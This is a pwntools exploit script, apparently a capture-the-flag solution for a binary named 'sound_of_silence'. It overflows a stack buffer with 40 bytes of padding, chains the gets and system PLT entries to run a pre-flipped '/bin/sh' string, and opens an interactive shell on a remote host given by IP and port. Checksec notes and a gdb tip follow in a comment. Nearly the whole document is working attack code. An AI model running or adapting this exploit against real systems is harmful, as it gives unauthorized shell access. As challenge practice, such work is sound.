#!/usr/bin/env python3

from pwn import *

exe = './sound_of_silence'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

#p = process(exe)
p = remote('94.237.54.152',42460)

padding = 40

payload = flat(
    asm('nop')*padding,#padding to reach EIP
    elf.plt.gets,#call gets to read in /bin/sh
    elf.plt.system,
)

p.sendlineafter(b'>> ',payload)
p.sendline("/bin0sh\x00") #sending /bin/sh to gets, 4 byte fliped to check the lock, so we just have to pre flip it
p.interactive()
'''
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'

in gdb 
# set follow-fork-mode parent

'''
